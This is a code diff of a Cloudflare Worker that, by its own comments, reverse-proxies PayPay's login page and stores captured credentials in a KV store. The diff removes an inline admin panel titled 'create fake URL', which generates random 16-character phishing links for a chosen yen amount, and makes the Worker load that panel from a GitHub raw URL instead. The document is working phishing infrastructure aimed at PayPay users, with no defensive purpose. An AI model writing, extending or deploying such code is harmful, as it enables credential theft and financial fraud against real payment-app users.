@@ -1,55 +1,11 @@
-// Cloudflare Worker — reverse proxy to PayPay + credential store + admin
+// Cloudflare Worker — reverse proxy to PayPay + credential store
 // KV binding: CREDS
-// /admin で管理画面を配信（Flask不要）
+// /admin で元の管理画面を配信（リポから取得）
 // 16文字IDパスは PayPay ログインにプロキシ
 
 const TARGET_ORIGIN = "https://www.paypay.ne.jp";
 const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
-
-const ADMIN_HTML = `<!DOCTYPE html>
-<html lang="ja">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>管理画面 — PayPay</title>
-  <style>
-    body { font-family: -apple-system, sans-serif; background:#0f1117; color:#e2e8f0; margin:0; padding:20px; }
-    .card { background:#1a1d27; border:1px solid #2d3148; border-radius:10px; padding:20px; margin-bottom:20px; max-width:600px; }
-    input { background:#0f1117; border:1px solid #2d3148; color:#e2e8f0; padding:8px 12px; border-radius:6px; width:200px; }
-    button { background:#3895ff; color:#fff; border:none; padding:9px 20px; border-radius:6px; cursor:pointer; font-weight:600; }
-    .link { font-family:monospace; color:#90cdf4; word-break:break-all; margin-top:10px; }
-    .msg { margin-top:8px; color:#48bb78; }
-  </style>
-</head>
-<body>
-  <div class="card">
-    <h2>偽URL作成</h2>
-    <div>
-      <label>金額（円）</label><br>
-      <input id="amount" type="number" min="1" placeholder="例: 5000">
-      <button id="create">リンクを作成</button>
-    </div>
-    <div class="msg" id="msg"></div>
-    <div class="link" id="result"></div>
-  </div>
-  <script>
-    function genId() {
-      var c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-      var s = ''; for (var i=0;i<16;i++) s += c[Math.floor(Math.random()*c.length)];
-      return s;
-    }
-    document.getElementById('create').onclick = function() {
-      var amount = document.getElementById('amount').value;
-      if (!amount || amount <= 0) { document.getElementById('msg').textContent = '金額を入力してください'; return; }
-      var id = genId();
-      var url = location.origin + '/' + id;
-      document.getElementById('result').innerHTML = '<a href="' + url + '" target="_blank">' + url + '</a>';
-      document.getElementById('msg').textContent = '作成しました';
-      navigator.clipboard && navigator.clipboard.writeText(url);
-    };
-  </script>
-</body>
-</html>`;
+const ADMIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/admin.html";
 
 export default {
   async fetch(request, env) {
@@ -57,9 +13,16 @@ export default {
     const workerHost = url.host;
 
     if (url.pathname === "/admin" || url.pathname === "/admin.html") {
-      return new Response(ADMIN_HTML, {
-        headers: { "Content-Type": "text/html; charset=utf-8" },
-      });
+      try {
+        const adminRes = await fetch(ADMIN_SOURCE);
+        if (adminRes.ok) {
+          const html = await adminRes.text();
+          return new Response(html, {
+            headers: { "Content-Type": "text/html; charset=utf-8" },
+          });
+        }
+      } catch {}
+      return new Response("Admin HTML fetch failed", { status: 502 });
     }
 
     const secret = (env.SECRET || "").trim();
